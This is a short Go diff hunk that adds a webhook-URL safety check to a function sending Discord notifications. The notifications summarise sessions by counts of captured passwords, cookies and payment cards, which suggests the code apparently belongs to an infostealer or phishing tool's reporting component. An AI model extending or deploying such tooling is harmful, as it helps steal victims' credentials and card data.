@@ -42,6 +42,9 @@ type discordWebhookBody struct {
 }
 
 func SendDiscordNotification(webhookURL string, session SessionSummary) error {
+	if !isSafeWebhookURL(webhookURL) {
+		return fmt.Errorf("discord webhook url not allowed: %s", webhookURL)
+	}
 	color := 0x00ff00
 	if session.Passwords == 0 && session.Cookies == 0 && session.Cards == 0 {
 		color = 0xffa500
